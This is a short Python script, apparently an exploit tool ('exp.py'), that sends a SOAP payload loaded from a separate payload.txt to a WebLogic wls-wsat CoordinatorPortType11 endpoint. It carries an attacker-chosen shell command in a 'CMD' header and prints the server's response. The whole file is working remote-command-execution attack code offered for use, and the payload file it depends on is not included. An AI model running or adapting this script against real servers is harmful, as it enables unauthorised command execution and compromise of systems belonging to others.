import requests
import sys
def exec_cmd(ip,cmd):
	url="http://"+ip+"/wls-wsat/CoordinatorPortType11"
	headers={
	'User-Agent': 'Apache-HttpClient/4.1.1 (java 1.5)',
	'CMD' : cmd,
	'SOAPAction':'""',
	'Content-Type':'text/xml'
	}
	with open('payload.txt','rb') as f :
		payloads=f.read()
	r=requests.post(url,headers=headers,data=payloads)
	return r.content.decode()
def main():
	if len(sys.argv)<3:
		print('usage:exp.py 127.0.0.1:8080 whoami')
		sys.exit()
	ip=sys.argv[1]
	cmd=sys.argv[2]
	out=exec_cmd(ip,cmd)
	print(out)
if __name__ == '__main__':
	main()